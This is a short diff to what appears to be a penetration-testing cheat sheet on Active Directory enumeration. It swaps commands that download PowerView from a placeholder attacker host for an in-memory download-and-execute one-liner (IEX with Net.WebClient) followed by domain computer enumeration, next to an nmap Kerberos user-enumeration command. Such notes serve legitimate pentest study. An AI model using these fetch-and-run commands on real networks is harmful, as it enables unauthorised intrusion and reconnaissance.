@@ -113,14 +113,10 @@ nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spooky
 
 ```powershell
 
-Invoke-WebRequest -Uri "attacker_ip.powerview.ps1" -OutFile "powerview.ps1"`
-`curl http://xxx/file.xxx -o file.xxx
+# download and execute commands
 
-. .\powerview.ps1
+IEX(New-Object Net.WebClient).downloadString('http://192.168.1.xxx/PowerView.ps1'); Get-NetComputer | select cn;
 
-# or 
-
-Import-Module .\powerview.ps1
 
 ```
 
